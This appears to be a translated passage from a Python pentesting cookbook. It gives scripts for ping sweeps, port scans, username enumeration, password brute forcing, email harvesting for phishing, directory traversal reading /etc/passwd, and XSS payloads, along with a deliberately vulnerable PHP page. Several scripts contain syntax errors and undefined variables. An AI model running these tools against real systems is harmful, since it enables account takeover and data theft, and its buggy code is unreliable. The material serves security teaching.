networkaddr = iplist1[0]+"."+iplist1[1]+"."+iplist[2]+"."

start_ip_last_octet = int(iplist1[3])
end_ip_last_octet = int(iplist2[3])

if iplist1[3]<iplist2[3]:
  print "Pinging range "+networkaddr+str(start_ip_last_octet)+"- "+str(end_ip_last_octet)
else
  print "Pinging "+networkaddr+str(startiplastoctect)+"\n"

for x in range(start_ip_last_octet, end_ip_last_octet+1)
  packet=IP(dst=networkaddr+str(x))/ICMP()
  response = sr1(packet,timeout=2,verbose=0)
  if not (response is None):
    if  response[ICMP].type==0:
      livehosts.append(networkaddr+str(x))

print "Scan complete!\n"
if len(livehosts)>0:
  print "Hosts found:\n"
  for host in livehosts:
    print host+"\n"
else:
  print "No live hosts found\n"
```

## 它是如何工作的…

脚本的第一部分将设置在运行 Scapy 时抑制警告消息。在没有配置 IPv6 的机器上导入 Scapy 时，一个常见的情况是收到关于无法通过 IPv6 路由的警告消息。

```py
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
```

下一部分导入必要的模块，验证接收到的参数数量，并设置一个用于存储发现的活动主机的列表：

```py
import sys 
from scapy.all import *

if len(sys.argv) !=3:
    print "usage: %s start_ip_addr end_ip_addr" % (sys.argv[0])
    sys.exit(0)

livehosts=[]
```

然后我们编译一个正则表达式，用于检查 IP 地址的有效性。这不仅检查字符串的格式，还检查它是否存在于 IPv4 地址空间中。然后使用编译后的正则表达式与提供的参数进行匹配：

```py
#IP address validation
ipregex=re.compile("^([0-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0- 9]|25[0-5])\.([0-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0- 5])\.([0-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])\.([0- 9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])$")

if (ipregex.match(sys.argv[1]) is None):
  print "Starting IP address is invalid"
  sys.exit(0)
if (ipregex.match(sys.argv[1]) is None):
  print "End IP address is invalid"
  sys.exit(0)
```

一旦 IP 地址被验证，就会进行进一步的检查，以确保提供的范围是有效的，并分配将用于设置循环参数的变量：

```py
iplist1 = sys.argv[1].split(".")
iplist2 = sys.argv[2].split(".")

if not (iplist1[0]==iplist2[0] and iplist1[1]==iplist2[1] and iplist1[2]==iplist2[2])
  print "IP addresses are not in the same class C subnet"
  sys.exit(0)

if iplist1[3]>iplist2[3]:
  print "Starting IP address is greater than ending IP address"
  sys.exit(0)

networkaddr = iplist1[0]+"."+iplist1[1]+"."+iplist[2]+"."

start_ip_last_octet = int(iplist1[3])
end_ip_last_octet = int(iplist2[3])
```

脚本的下一部分纯粹是信息性的，可以省略。它将打印出要 ping 的 IP 地址范围，或者在提供的两个参数相等的情况下，要 ping 的 IP 地址：

```py
if iplist1[3]<iplist2[3]:
  print "Pinging range "+networkaddr+str(start_ip_last_octet)+"- "+str(end_ip_last_octet)
else
  print "Pinging "+networkaddr+str(startiplastoctect)+"\n"
```

然后我们进入循环，并开始创建一个 ICMP 数据包：

```py
for x in range(start_ip_last_octet, end_ip_last_octet+1)
  packet=IP(dst=networkaddr+str(x))/ICMP()
```

之后，我们使用`sr1`命令发送数据包并接收一个数据包返回：

```py
response = sr1(packet,timeout=2,verbose=0)
```

最后，我们检查是否收到了响应，以及响应代码是否为`0`。这是因为响应代码为`0`表示回显回复。其他代码可能报告无法到达目的地。如果响应通过了这些检查，那么 IP 地址将被追加到`livehosts`列表中。

```py
if not (response is None):
    if  response[ICMP].type==0:
      livehosts.append(networkaddr+str(x))
```

如果找到了活动主机，脚本将打印出列表。

# 使用 Scapy 进行扫描

Scapy 是一个强大的工具，可用于操纵网络数据包。虽然我们不会深入探讨 Scapy 可以完成的所有工作，但我们将在本教程中使用它来确定目标上打开的 TCP 端口。通过识别目标上打开的端口，您可以确定正在运行的服务类型，并使用这些服务进一步进行测试。

## 如何做...

这是将在给定端口范围内对特定目标执行端口扫描的脚本。它接受目标、端口范围的起始和结束参数：

```py
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

import sys 
from scapy.all import *

if len(sys.argv) !=4:
    print "usage: %s target startport endport" % (sys.argv[0])
    sys.exit(0)

target = str(sys.argv[1])
startport = int(sys.argv[2])
endport = int(sys.argv[3])
print "Scanning "+target+" for open TCP ports\n"
if startport==endport:
  endport+=1
for x in range(startport,endport):
    packet = IP(dst=target)/TCP(dport=x,flags="S")
    response = sr1(packet,timeout=0.5,verbose=0)
    if response.haslayer(TCP) and response.getlayer(TCP).flags == 0x12:
    print "Port "+str(x)+" is open!"
    sr(IP(dst=target)/TCP(dport=response.sport,flags="R"), timeout=0.5, verbose=0)

print "Scan complete!\n"
```

## 工作原理...

您在本教程中注意到的第一件事是脚本的前两行：

```py
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
```

这些行用于抑制 Scapy 在未配置 IPv6 路由时创建的警告，这会导致以下输出：

```py
WARNING: No route found for IPv6 destination :: (no default route?)

```

这对于脚本的功能并不是必需的，但在运行时可以使输出更整洁。

接下来的几行将验证参数的数量并将参数分配给脚本中使用的变量。脚本还会检查端口范围的起始和结束是否相同，并递增结束端口以便循环能够工作。

设置完成后，我们将循环遍历端口范围，脚本的真正内容随之而来。首先，我们创建一个基本的 TCP 数据包：

```py
packet = IP(dst=target)/TCP(dport=x,flags="S")
```

然后我们使用`sr1`命令。这个命令是`send/receive1`的缩写。此命令将发送我们创建的数据包并接收返回的第一个数据包。我们提供的其他参数包括超时，因此脚本不会挂起关闭或过滤的端口，我们设置的详细参数将关闭 Scapy 在发送数据包时通常创建的输出。

然后脚本会检查是否有包含 TCP 数据的响应。如果包含 TCP 数据，则脚本将检查 SYN 和 ACK 标志。这些标志的存在将指示 SYN-ACK 响应，这是 TCP 协议握手的一部分，并显示端口是打开的。

如果确定某个端口是打开的，将打印输出以此效果，并且代码的下一行发送重置：

```py
sr(IP(dst=target)/TCP(dport=response.sport,flags="R"),timeout=0.5, verbose=0)
```

这一行是必要的，以便关闭连接并防止发生 TCP SYN 洪水攻击，如果端口范围和打开端口的数量很大。

## 还有更多...

在本教程中，我们向您展示了如何使用 Scapy 执行 TCP 端口扫描。本教程中使用的技术可以被调整以在主机上执行 UDP 端口扫描或在一系列主机上执行 ping 扫描。

这只是触及 Scapy 能力的表面。有关更多信息，一个很好的起点是官方 Scapy 网站[`www.secdev.org/projects/scapy/`](http://www.secdev.org/projects/scapy/)。

# 检查用户名的有效性

在进行侦察时，您可能会遇到网络应用程序的部分，这些部分将允许您确定某些用户名是否有效。一个典型的例子是当您忘记密码时，页面允许您请求密码重置。例如，如果页面要求您输入用户名以进行密码重置，它可能会根据用户名是否存在而给出不同的响应。因此，如果用户名不存在，页面可能会响应“找不到用户名”或类似的内容。但是，如果用户名存在，它可能会将您重定向到登录页面，并通知您“密码重置说明已发送到您注册的电子邮件地址”。

## 准备工作

每个网络应用程序可能都不同。因此，在继续创建用户名检查工具之前，您需要进行侦察。您需要找到的详细信息包括访问请求密码重置的页面，需要发送到该页面的参数，以及成功或失败结果的情况。

## 如何做...

一旦您了解了目标上密码重置请求的工作原理，就可以组装您的脚本。以下是您的工具的示例：

```py
#basic username check
import sys
import urllib
import urllib2

if len(sys.argv) !=2:
    print "usage: %s username" % (sys.argv[0])
    sys.exit(0)

url = "http://www.vulnerablesite.com/resetpassword.html"
username = str(sys.argv[1])
data = urllib.urlencode({"username":username})
response = urllib2.urlopen(url,data).read()
UnknownStr="Username not found"
if(response.find(UnknownStr)<0):
  print "Username does not exist\n"
else
  print "Username exists!"
```

以下显示了使用此脚本时产生的输出示例：

```py
user@pc:~# python usernamecheck.py randomusername

Username does not exist

user@pc:~# python usernamecheck.py admin

Username exists!

```

## 它是如何工作的...

在验证了参数数量并将参数分配给变量之后，我们使用`urllib`模块对要提交到页面的数据进行编码：

```py
data = urllib.urlencode({"username":username})
```

然后我们寻找指示请求由于不存在的用户名而失败的字符串：

```py
UnknownStr="Username not found"
```

find（`str`）的结果并不是简单的 true 或 false。相反，它将返回在字符串中找到子字符串的位置。但是，如果它没有找到您正在搜索的子字符串，它将返回`1`。

## 还有更多...

此示例可以适应其他情况。密码重置可能会要求输入电子邮件地址而不是用户名。或者成功的响应可能会显示用户注册的电子邮件地址。重要的是要注意可能会透露比应该更多信息的 Web 应用程序的情况。

## 另请参阅

对于更大的工作，您将希望考虑使用*暴力破解用户名*示例。

# 暴力破解用户名

对于小型但常规的情况，一个快速检查工具就足够了。那么对于更大的工作呢？也许您从开源情报收集中获得了大量数据，并且想要查看这些用户中有多少使用您正在针对的应用程序。这个示例将向您展示如何自动化检查您在文件中存储的用户名的过程。

## 准备工作

在使用此示例之前，您需要获取要测试的用户名列表。这可以是您自己创建的内容，也可以使用 Kali 中找到的字典。如果需要创建自己的列表，一个好的起点是使用可能在 Web 应用程序中找到的常见名称。这些可能包括用户名，如`user`，`admin`，`administrator`等。

## 如何做...

此脚本将尝试检查提供的用户名列表，以确定该应用程序中是否存在帐户：

```py
#brute force username enumeration
import sys
import urllib
import urllib2

if len(sys.argv) !=2:
    print "usage: %s filename" % (sys.argv[0])
    sys.exit(0)

filename=str(sys.argv[1])
userlist = open(filename,'r')
url = "http://www.vulnerablesite.com/forgotpassword.html"
foundusers = []
UnknownStr="Username not found"

for user in userlist:
  user=user.rstrip()
  data = urllib.urlencode({"username":user})
  request = urllib2.urlopen(url,data)
  response = request.read()

  if(response.find(UnknownStr)>=0):
    foundusers.append(user)
  request.close()
userlist.close()

if len(foundusers)>0:
  print "Found Users:\n"
  for name in foundusers:
    print name+"\n"
else:
  print "No users found\n"
```

以下是此脚本的输出示例：

```py
python bruteusernames.py userlist.txt
Found Users:
admin
angela
bob
john

```

## 它是如何工作的...

此脚本引入了比基本用户名检查更多的概念。其中之一是打开文件以加载我们的列表：

```py
userlist = open(filename,'r')
```

这将打开包含我们用户名列表的文件，并将其加载到我们的`userlist`变量中。然后我们循环遍历列表中的用户。在此示例中，我们还使用了以下代码行：

```py
user=user.strip()
```

此命令会去除空格，包括换行符，有时这会改变提交前的编码结果。

如果用户名存在，则将其附加到列表中。当所有用户名都已检查时，将输出列表的内容。

## 另请参阅

对于单个用户名，您将希望使用*基本用户名检查*示例。

# 枚举文件

在枚举 Web 应用程序时，您将希望确定哪些页面存在。通常使用的常见做法是所谓的蜘蛛爬行。蜘蛛爬行通过访问网站，然后跟踪该页面内的每个链接以及该网站内的任何后续页面。但是，对于某些网站，例如维基，如果链接在访问时执行编辑或删除功能，则此方法可能导致数据被删除。此示例将取而代之，它将获取常见的 Web 页面文件名列表，并检查它们是否存在。

## 准备工作

对于这个示例，您需要创建一个常见的页面名称列表。渗透测试发行版，如 Kali Linux，将配备各种暴力破解工具的字典，这些字典可以用来代替生成您自己的字典。

## 如何做...

以下脚本将获取可能的文件名列表，并测试页面是否存在于网站中：

```py
#bruteforce file names
import sys
import urllib2

if len(sys.argv) !=4:
    print "usage: %s url wordlist fileextension\n" % (sys.argv[0])
    sys.exit(0)

base_url = str(sys.argv[1])
wordlist= str(sys.argv[2])
extension=str(sys.argv[3])
filelist = open(wordlist,'r')
foundfiles = []

for file in filelist:
  file=file.strip("\n")
  extension=extension.rstrip()
  url=base_url+file+"."+str(extension.strip("."))
  try:
    request = urllib2.urlopen(url)
    if(request.getcode()==200):
      foundfiles.append(file+"."+extension.strip("."))
    request.close()
  except urllib2.HTTPError, e:
    pass

if len(foundfiles)>0:
  print "The following files exist:\n"
  for filename in foundfiles:
    print filename+"\n"
else:
  print "No files found\n"
```

以下输出显示了针对**Damn Vulnerable Web App** (**DVWA**)使用常见网页列表运行时可能返回的内容：

```py
python filebrute.py http://192.168.68.137/dvwa/ filelist.txt .php
The following files exist:

index.php

about.php

login.php

security.php

logout.php

setup.php

instructions.php

phpinfo.php

```

## 工作原理…

导入必要的模块并验证参数的数量后，要检查的文件名列表以只读模式打开，这由文件的`open`操作中的`r`参数表示：

```py
filelist = open(wordlist,'r')
```

当脚本进入文件名列表的循环时，会从文件名中剥离任何换行符，因为这会影响检查文件名存在时 URL 的创建。如果提供的扩展名中存在前置的`.`，那么也会被剥离。这允许使用包含或不包含前置`.`的扩展名，例如`.php`或`php`：

```py
  file=file.strip("\n")
  extension=extension.rstrip()
  url=base_url+file+"."+str(extension.strip("."))
```

然后脚本的主要操作是检查给定文件名的网页是否存在，通过检查`HTTP 200`代码并捕获任何不存在页面的错误：

```py
  try:
    request = urllib2.urlopen(url)
    if(request.getcode()==200):
      foundfiles.append(file+"."+extension.strip("."))
    request.close()
  except urllib2.HTTPError, e:
    pass
```

# 暴力破解密码

暴力破解可能不是最优雅的解决方案，但它将自动化可能是一项单调的任务。通过使用自动化，您可以更快地完成任务，或者至少可以让自己有时间同时处理其他事情。

## 准备工作

要使用此方法，您需要一个要测试的用户名列表，还需要一个密码列表。虽然这不是暴力破解的真正定义，但它会减少您要测试的组合数量。

### 注意

如果您没有密码列表可用，网上有许多可用的列表，例如 GitHub 上的前 10000 个最常见密码，链接在[`github.com/neo/discourse_heroku/blob/master/lib/common_passwords/10k-common-passwords.txt`](https://github.com/neo/discourse_heroku/blob/master/lib/common_passwords/10k-common-passwords.txt)。

## 操作步骤…

以下代码显示了如何实现此方法的示例：

```py
#brute force passwords
import sys
import urllib
import urllib2

if len(sys.argv) !=3:
    print "usage: %s userlist passwordlist" % (sys.argv[0])
    sys.exit(0)

filename1=str(sys.argv[1])
filename2=str(sys.argv[2])
userlist = open(filename1,'r')
passwordlist = open(filename2,'r')
url = "http://www.vulnerablesite.com/login.html"
foundusers = []
FailStr="Incorrect User or Password"

for user in userlist:
  for password in passwordlist:
    data = urllib.urlencode({"username="user&"password="password})
    request = urllib2.urlopen(url,data)
    response = request.read()
    if(response.find(FailStr)<0)
      foundcreds.append(user+":"+password)
    request.close()

if len(foundcreds)>0:
  print "Found User and Password combinations:\n"
  for name in foundcreds:
    print name+"\n"
else:
  print "No users found\n"
```

以下是运行脚本时产生的输出示例：

```py
python bruteforcepasswords.py userlists.txt passwordlist.txt

Found User and Password combinations:

root:toor

angela:trustno1

bob:password123

john:qwerty

```

## 工作原理…

在最初导入必要的模块并检查系统参数后，我们设置了密码检查：

```py
filename1=str(sys.argv[1])
filename2=str(sys.argv[2])
userlist = open(filename1,'r')
passwordlist = open(filename2,'r')
```

文件名参数存储在变量中，然后被打开。`r`变量表示我们以只读方式打开这些文件。

我们还指定了目标，并初始化一个数组来存储我们找到的任何有效凭据：

```py
url = "http://www.vulnerablesite.com/login.html"
foundusers = []
FailStr="Incorrect User or Password"
```

前面代码中的`FailStr`变量只是为了让我们的生活更轻松，通过使用一个简短的变量名来代替整个字符串的输入。

此方法的主要部分在一个嵌套循环中，我们在其中进行自动密码检查：

```py
for user in userlist:
  for password in passwordlist:
    data = urllib.urlencode({"username="user&"password="password })
    request = urllib2.urlopen(url,data)
    response = request.read()
    if(response.find(FailStr)<0)
      foundcreds.append(user+":"+password)
    request.close()
```

在此循环中，将发送一个包含用户名和密码的请求。如果响应不包含指示用户名和密码组合无效的字符串，那么我们知道我们有一组有效的凭据。然后将这些凭据添加到我们之前创建的数组中。

一旦尝试了所有的用户名和密码组合，我们就会检查数组，看看是否有任何凭据。如果有，我们就打印出凭据。如果没有，我们就打印出一个悲伤的消息，告诉我们我们什么都没找到：

```py
if len(foundcreds)>0:
  print "Found User and Password combinations:\n"
  for name in foundcreds:
    print name+"\n"
else:
  print "No users found\n"
```

## 另请参阅

如果您想要查找用户名，您可能还想使用*检查用户名有效性*和*暴力破解用户名*的方法。

# 从名称生成电子邮件地址

在某些情况下，您可能有一个目标公司的员工名单，并且想要生成一个电子邮件地址列表。电子邮件地址可能会有用。您可能想要使用它们来执行网络钓鱼攻击，或者您可能想要使用它们来尝试登录到公司的应用程序，例如包含敏感内部文档的电子邮件或企业门户。

## 准备工作

在使用此示例之前，您需要有一个要处理的姓名列表。如果没有姓名列表，您可能首先要考虑对目标进行开源情报练习。

## 如何做...

以下代码将获取一个包含姓名列表的文件，并生成不同格式的电子邮件地址列表：

```py
import sys

if len(sys.argv) !=3:
  print "usage: %s name.txt email suffix" % (sys.argv[0])
  sys.exit(0)
for line in open(sys.argv[1]):
  name = ''.join([c for c in line if c == " " or c.isalpha()])
  tokens = name.lower().split()
  fname = tokens[0]
  lname = tokens[-1]
  print fname+lname+sys.argv[2]
  print lname+fname+sys.argv[2]
  print fname+"."+lname+sys.argv[2]
  print lname+"."+fname+sys.argv[2]
  print lname+fname[0]+sys.argv[2]
  print fname+lname+fname+sys.argv[2]
  print fname[0]+lname+sys.argv[2]
  print fname[0]+"."+lname+sys.argv[2]
  print lname[0]+"."+fname+sys.argv[2]
  print fname+sys.argv[2]
  print lname+sys.argv[2]
```

## 它是如何工作的...

此示例中的主要机制是使用字符串连接。通过将名字或姓氏的不同组合与电子邮件后缀连接起来，您可以得到一个潜在的电子邮件地址列表，然后可以在以后的测试中使用。

## 还有更多...

所示的示例显示了如何使用姓名列表生成电子邮件地址列表。但并非所有电子邮件地址都是有效的。您可以通过在公司的应用程序中使用枚举技术来进一步缩小此列表，这可能会揭示电子邮件地址是否存在。您还可以进行进一步的开源情报调查，这可能会让您确定目标组织的电子邮件地址的正确格式。如果您成功做到了这一点，那么您可以从示例中删除任何不必要的格式，以生成更简洁的电子邮件地址列表，这将在以后为您提供更大的价值。

## 另请参阅

一旦您获得了电子邮件地址，您可能希望将它们作为*检查用户名有效性*示例的一部分使用。

# 从网页中查找电子邮件地址

与其生成自己的电子邮件列表，您可能会发现目标组织在其网页上存在一些电子邮件地址。这可能会比您自己生成的电子邮件地址具有更高的价值，因为目标组织网站上的电子邮件地址的有效性可能会比您尝试猜测的要高得多。

## 准备工作

对于此示例，您需要一个要解析电子邮件地址的页面列表。您可能希望访问目标组织的网站，并搜索站点地图。然后可以解析站点地图以获取存在于网站内的页面链接。

## 如何做...

以下代码将解析 URL 列表的响应，查找与电子邮件地址格式匹配的文本实例，并将它们保存到文件中：

```py
import urllib2
import re
import time
from random import randint
regex = re.compile(("([a-z0-9!#$%&'*+\/=?^_'{|}~-]+(?:\.[a-z0- 9!#$%&'*+\/=?^_'"
                    "{|}~-]+)*(@|\sat\s)(?:a-z0-9?(\.|"
                    "\sdot\s))+a-z0-9?)"))

tarurl = open("urls.txt", "r")
for line in tarurl:
  output = open("emails.txt", "a")
  time.sleep(randint(10, 100))
  try: 
    url = urllib2.urlopen(line).read()
    output.write(line)
    emails = re.findall(regex, url)
    for email in emails:
      output.write(email[0]+"\r\n")
      print email[0]
  except:
    pass
    print "error"
  output.close()
```

## 它是如何工作的...

导入必要的模块后，您将看到`regex`变量的赋值：

```py
regex = re.compile(("([a-z0-9!#$%&'*+\/=?^_'{|}~-]+(?:\.[a-z0- 9!#$%&'*+\/=?^_'"
                    "{|}~-]+)*(@|\sat\s)(?:a-z0-9?(\.|"
                    "\sdot\s))+a-z0-9?)"))
```

这尝试匹配电子邮件地址格式，例如`victim@target.com`，或者 victim at target dot com。然后，代码打开一个包含 URL 的文件：

```py
tarurl = open("urls.txt", "r")
```

您可能会注意到参数`r`的使用。这以只读模式打开文件。然后，代码循环遍历 URL 列表。在循环内，打开一个文件来保存电子邮件地址：

```py
output = open("emails.txt", "a")
```

这次使用了参数`a`。这表示对该文件的任何输入都将被追加而不是覆盖整个文件。脚本利用睡眠计时器以避免触发目标可能已经设置的任何防护措施来防止攻击：

```py
time.sleep(randint(10, 100))
```

此计时器将暂停脚本，随机间隔时间在`10`和`100`秒之间。

在使用`urlopen()`方法时，异常处理是至关重要的。如果`urlopen()`的响应是`404（HTTP 未找到错误）`，那么脚本将出错并退出。

如果有有效的响应，脚本将把所有电子邮件地址的实例存储在`emails`变量中：

```py
emails = re.findall(regex, url)
```

然后，它将循环遍历`emails`变量，并将列表中的每个项目写入`emails.txt`文件，并在控制台上输出以进行确认：

```py
    for email in emails:
      output.write(email[0]+"\r\n")
      print email[0]
```

## 还有更多...

本示例中使用的正则表达式匹配了互联网上表示电子邮件地址的两种常见格式。在学习和调查过程中，您可能会遇到其他您想要包含在匹配中的格式。有关 Python 中正则表达式的更多信息，您可以阅读 Python 网站上有关正则表达式的文档[`docs.python.org/2/library/re.html`](https://docs.python.org/2/library/re.html)。

## 另请参阅

有关更多信息，请参阅食谱*从名称生成电子邮件地址*。

# 在源代码中查找注释

常见的安全问题是由良好的编程实践引起的。在 Web 应用程序的开发阶段，开发人员会注释他们的代码。这在开发阶段非常有用，因为它有助于理解代码，并将作为各种原因的有用提醒。然而，当 Web 应用程序准备在生产环境中部署时，最佳做法是删除所有这些注释，因为它们可能对攻击者有用。

本示例将结合使用`Requests`和`BeautifulSoup`来搜索 URL 中的注释，以及在页面上搜索链接，并在这些后续 URL 中搜索注释。从页面上跟踪链接并分析这些 URL 的技术称为爬虫。

## 如何做…

以下脚本将在源代码中抓取 URL 的注释和链接。然后还将执行有限的爬虫并搜索链接的 URL 以查找注释：

```py
import requests
import re

from bs4 import BeautifulSoup
import sys

if len(sys.argv) !=2:
    print "usage: %s targeturl" % (sys.argv[0])
    sys.exit(0)

urls = []

tarurl = sys.argv[1]
url = requests.get(tarurl)
comments = re.findall('<!--(.*)-->',url.text)
print "Comments on page: "+tarurl
for comment in comments:
    print comment

soup = BeautifulSoup(url.text)
for line in soup.find_all('a'):
    newline = line.get('href')
    try:
        if newline[:4] == "http":
            if tarurl in newline:
                urls.append(str(newline))
        elif newline[:1] == "/":
            combline = tarurl+newline
            urls.append(str(combline))
    except:
        pass
        print "failed"
for uurl in urls:
    print "Comments on page: "+uurl
    url = requests.get(uurl)
    comments = re.findall('<!--(.*)-->',url.text)
    for comment in comments:
        print comment
```

## 它的工作原理…

在导入必要的模块并设置变量之后，脚本首先获取目标 URL 的源代码。

您可能已经注意到，对于`Beautifulsoup`，我们有以下行：

```py
from bs4 import BeautifulSoup
```

这样，当我们使用`BeautifulSoup`时，我们只需输入`BeautifulSoup`而不是`bs4.BeautifulSoup`。

然后搜索所有 HTML 注释的实例并将其打印出来：

```py
url = requests.get(tarurl)
comments = re.findall('<!--(.*)-->',url.text)
print "Comments on page: "+tarurl
for comment in comments:
    print comment
```

然后，脚本将使用`Beautifulsoup`来抓取源代码中任何绝对（以`http`开头）和相对（以`/`开头）链接的实例：

```py
if newline[:4] == "http":
            if tarurl in newline:
                urls.append(str(newline))
        elif newline[:1] == "/":
            combline = tarurl+newline
            urls.append(str(combline))
```

一旦脚本整理出从页面链接出去的 URL 列表，它将搜索每个页面的 HTML 注释。

## 还有更多…

本示例展示了注释抓取和爬虫的基本示例。可以根据需要为此示例添加更多智能。例如，您可能希望考虑使用以`。`或`..`开头的相对链接来表示当前目录和父目录。

您还可以对爬虫部分进行更多控制。您可以从提供的目标 URL 中提取域，并创建一个过滤器，不会抓取目标外部的域的链接。这对于需要遵守目标范围的专业工作特别有用。


# 第三章：漏洞识别

在本章中，我们将涵盖以下主题：

+   自动化基于 URL 的目录遍历

+   自动化跨站脚本（参数和 URL）

+   自动化基于参数的跨站脚本

+   自动模糊测试

+   jQuery 检查

+   基于头部的跨站脚本

+   Shellshock 检查

# 介绍

本章重点介绍从**开放式 Web 应用安全项目**（**OWASP**）的前 10 个传统 Web 应用程序漏洞。这将包括**跨站脚本**（**XSS**），目录遍历以及那些简单到不需要单独章节检查的其他漏洞。本章提供了每个脚本的基于参数和基于 URL 的版本，以适应任何情况并减少单个脚本的复杂性。大多数这些工具都有完全成熟的替代方案，比如 Burp Intruder。看到每个工具以其简单的 Python 形式的好处在于，它让你了解如何构建和制作自己的版本。

# 自动化基于 URL 的目录遍历

偶尔，网站使用不受限制的函数调用文件；这可能导致传说中的目录遍历或**直接对象引用**（**DOR**）。在这种攻击中，用户可以通过使用一个易受攻击的参数在网站的上下文中调用任意文件。这可以通过两种方式进行操纵：首先，通过提供绝对链接，比如`/etc/passwd`，这表示从`root`目录浏览到`etc`目录并打开`passwd`文件，其次，相对链接，可以向上遍历目录以达到`root`目录并访问目标文件。

我们将创建一个脚本，尝试逐渐增加 URL 参数中的向上目录数量，以打开 Linux 机器上始终存在的文件`/etc/passwd`。它将通过检测到指示文件已被打开的短语 root 来确定何时成功。

## 准备工作

确定您要测试的 URL 参数。此脚本已配置为与大多数设备一起使用：`etc/passwd`应该适用于 OSX 和 Linux 安装，`boot.ini`应该适用于 Windows 安装。查看本示例的末尾，以获取可用于测试脚本有效性的 PHP 网页。

我们将使用可以通过`pip`安装的 requests 库。在作者看来，它在功能和可用性方面比`urllib`更好。

## 如何做…

一旦确定要攻击的参数，请将其作为命令行参数传递给脚本。您的脚本应与以下脚本相同：

```py
import requests
import sys
url = sys.argv[1]
payloads = {'etc/passwd': 'root', 'boot.ini': '[boot loader]'}
up = "../"
i = 0
for payload, string in payloads.iteritems():
  for i in xrange(7):
    req = requests.post(url+(i*up)+payload)
    if string in req.text:
      print "Parameter vulnerable\r\n"
      print "Attack string: "+(i*up)+payload+"\r\n"
      print req.text
      break
```

使用此脚本时产生的输出示例如下：

```py
Parameter vulnerable

Attack string: ../../../../../etc/passwd

Get me /etc/passwd! File Contents:root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
```

## 它是如何工作的…

我们导入我们在本书中到目前为止所需的库，就像我们做的其他脚本一样：

```py
url = sys.argv[1]
```

然后，我们以 URL 的形式输入。由于我们使用`requests`库，我们应该确保我们的 URL 与 requests 期望的形式匹配，即`http(s)://url`。如果你搞错了，requests 会提醒你：

```py
payloads = {'etc/passwd': 'root', 'boot.ini': '[boot loader]'}
```

我们建立我们将在每次攻击中发送的有效载荷的字典。每对中的第一个值是我们希望尝试加载的文件，第二个值是肯定会在该文件中的值。第二个值越具体，错误报告就会越少；但是，这可能会增加错误否定的机会。请随意在这里包含你自己的文件：

```py
up = "../"
i = 0
```

我们提供向上目录的快捷方式`../`并将其分配给向上变量，并将我们的循环计数器设置为`0`：

```py
for payload, string in payloads.iteritems():
  while i < 7:
```

`Iteritems`方法允许我们遍历字典并将每个键和值分配给变量。我们将第一个值分配为负载，第二个值分配为字符串。然后我们限制我们的循环，以防失败时无限重复。我将其设置为`7`，尽管这可以设置为任何您喜欢的值。请记住，Web 应用程序的目录结构可能高于`7`的可能性：

```py
req = requests.post(url+(i*up)+payload)
```

我们通过获取我们的根 URL，并根据循环和负载的当前数量附加上级目录的当前数量来构建我们的请求。然后将其发送到一个 post 请求中：

```py
if string in req.text:
      print "Parameter vulnerable\r\n"
      print "Attack string: "+(i*up)+payload+"\r\n"
      print req.text
      break
```

我们通过查看响应中是否包含我们预期的字符串来检查是否已经实现了我们的目标。如果字符串存在，我们将停止循环，并打印出攻击字符串以及成功攻击的响应。这样可以让我们手动验证攻击是否成功，或者代码是否需要重构，或者 Web 应用程序是否存在漏洞。

```py
    i = i+1
  i = 0
```

最后，计数器将添加到每个循环，直到达到预设的最大值。一旦达到最大值，它将被设置为下一个攻击字符串。

## 还有更多

这个方法可以通过应用本书其他地方展示的原则来适应通过参数工作。但是，由于页面通过参数调用的罕见性和故意的简洁性，这一点没有提供。

正如前面提到的，这可以通过添加额外的文件及其常见的字符串来扩展。一旦已经确定了目录遍历和到达根目录所需的深度，也可以扩展到抓取所有有趣的文件。

以下是一个 PHP 网页，可以让您在自己的构建上测试此脚本。只需将其放在您的`var/www`目录或您使用的其他解决方案中。不要在未知网络上保持此活动状态：

```py
<?php
echo "Get me /etc/passwd! File Contents";
if (!isset($_REQUEST['id'])){
header( 'Location: /traversal/first.php?id=1' ) ;
}
if (isset($_REQUEST['id'])){
  if ($_REQUEST['id'] == "1"){
    $file = file_get_contents("data.html", true);
    echo $file;}

else{
  $file = file_get_contents($_REQUEST['id']);
  echo $file;
}
}?>
```

# 自动化基于 URL 的跨站脚本攻击

反射型跨站脚本攻击通常通过基于 URL 的参数发生。你应该知道什么是跨站脚本攻击，如果你不知道，我为你感到尴尬。真的吗？我必须解释这个？好吧。跨站脚本攻击是将 JavaScript 注入到页面中。这是黑客入门课程，也是大多数人遇到或听说的第一种攻击。阻止跨站脚本攻击的低效方法主要集中在针对脚本标签，而脚本标签并不是在页面中使用 JavaScript 的必要条件，因此有许多绕过方法。

我们将创建一个脚本，采用各种标准的规避技术，并使用`Requests`库将它们应用于自动提交。我们将知道脚本是否成功，因为要么脚本本身，要么它的早期版本将出现在提交后的页面上。

## 如何做…

我们将使用的脚本如下：

```py
import requests
import sys
url = sys.argv[1]
payloads = ['<script>alert(1);</script>', '<BODY ONLOAD=alert(1)>']
for payload in payloads:
  req = requests.post(url+payload)
  if payload in req.text:
    print "Parameter vulnerable\r\n"
    print "Attack string: "+payload
    print req.text
    break
```

使用此脚本时产生的输出示例如下：

```py
Parameter vulnerable

Attack string: <script>alert(1);</script>

Give me XSS:
<script>alert(1);</script>
```

## 工作原理…

这个脚本类似于之前的目录遍历脚本。这次我们创建一个负载列表，而不是字典，因为检查字符串和负载是相同的：

```py
payloads = ['<script>alert(1);</script>', '<BODY ONLOAD=alert(1)>']
```

然后，我们使用与之前相似的循环来逐个提交这些值：

```py
for payload in payloads:
  req = requests.post(url+payload)
```

每个负载都被附加到我们的 URL 的末尾，以便作为未结束的参数发送，例如`127.0.0.1/xss/xss.php?comment=`。负载将被添加到该字符串的末尾，以便形成一个有效的语句。然后我们检查该字符串是否出现在以下页面中：

```py
if payload in req.text:
    print "Parameter vulnerable\r\n"
    print "Attack string: "+payload
    print req.text
    break
```

